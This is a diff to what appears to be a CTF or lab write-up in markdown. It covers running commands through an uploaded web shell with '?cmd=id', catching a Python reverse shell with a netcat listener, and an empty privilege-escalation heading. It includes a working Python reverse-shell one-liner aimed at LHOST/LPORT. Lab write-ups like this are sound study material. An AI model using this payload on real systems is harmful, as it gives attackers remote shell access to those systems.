@@ -168,6 +168,47 @@ Navigating to where the file was uploaded to
 
 Cool, we get this. Now add ```?cmd=id``` to the back of the url
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/30a88dbf-55e2-40c9-8f4d-7d69c5162cdf)
+
+Nice, now lets get a reverse shell back to our machine
+
+payload:```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```
+
+Ensure you edit the ```LHOST``` and ```LPORT``` to that which applies to you
+
+Before running that payload, I set up my netcat listener already
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5d633ab-8c39-4e06-a8fc-200258d973f0)
+
+Using the payload,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86052224-f64c-41a6-8df9-9e09f4b5d791)
+
+Checking my netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9a0fd000-34cc-4ca1-b09b-d2ca45c0ab73)
+
+We got a shell back to our machine. Lets go ahead and escalate our privileges
+
+
+
+
+# Privilege Escalation
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
